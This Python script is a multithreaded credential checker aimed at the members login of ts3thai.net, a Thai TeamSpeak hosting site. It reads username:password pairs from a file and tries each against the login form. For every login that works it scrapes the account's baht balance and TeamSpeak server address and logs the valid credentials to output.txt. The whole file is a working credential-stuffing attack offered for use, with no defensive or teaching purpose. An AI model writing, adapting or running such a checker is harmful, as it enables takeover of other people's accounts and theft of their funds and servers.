import threading
from httpx import post, get
import re

def do_server(html):
    match = re.search(r'ts3server://\S+', html)

    if match:
        url = match.group()
        url = url.split('">')[0]
        url = url.replace('ts3server://', '')
        return url
    else:
        print("ts3server not found")

def run(username, password):
    cookiePHP = post("https://www.ts3thai.net/members/", headers={
    }, data={
        "username": username,
        "password": password,
        "login_button": "%E0%B9%80%E0%B8%82%E0%B9%89%E0%B8%B2%E0%B8%AA%E0%B8%B9%E0%B9%88%E0%B8%A3%E0%B8%B0%E0%B8%9A%E0%B8%9A",
    })

    response = get("https://www.ts3thai.net/members/", headers={
    }, cookies=cookiePHP.cookies)

    if "images/botton/Money.png" in response.text: #NICEDAY
        _content = response.text
        server = do_server(_content)
        match = re.search(r':\s*([\d.]+)\s*บาท', _content)

        if match:
            monni = match.group(1)
            result = f"{username}:{password}|{monni}->{server}"
            print(result)

            with open('output.txt', 'a') as file:
                file.write(result + '\n')
        else:
            print("cant find monni but work")
            with open('output.txt', 'a') as file:
                result = f"{username}:{password}"
                file.write(result + '\n')
    else:
        print(response.status_code)

def read(filename):
    with open(filename, 'r') as file:
        lines = file.readlines()
    x = [line.strip().split(':') for line in lines]
    return x


threads = []
for user, password in read('data.txt'):
    thread = threading.Thread(target=run, args=(user, password))
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()
